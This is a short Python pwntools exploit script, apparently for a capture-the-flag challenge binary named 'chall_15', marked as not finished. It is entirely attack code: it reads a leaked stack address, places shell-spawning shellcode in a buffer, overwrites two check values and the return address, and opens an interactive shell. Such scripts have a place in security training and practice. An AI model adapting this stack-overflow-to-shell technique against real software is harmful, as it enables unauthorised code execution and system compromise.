from pwn import *

binary = context.binary = ELF('./chall_15')
context.arch="amd64"
p = process(binary.path)

p.recvuntil('\n')
_ = p.recvline().strip()
stack = int(_,16)
log.info('stack: ' + hex(stack))

shellcode = asm(shellcraft.sh())

payload = shellcode 
payload += b'a' * 232
payload += p32(0xdeadd00d)
payload += p32(0xb16b00b5)
payload += b'a' * 8 
payload += p64(stack)

p.sendline(payload)
p.interactive()
# NOT FINISHED
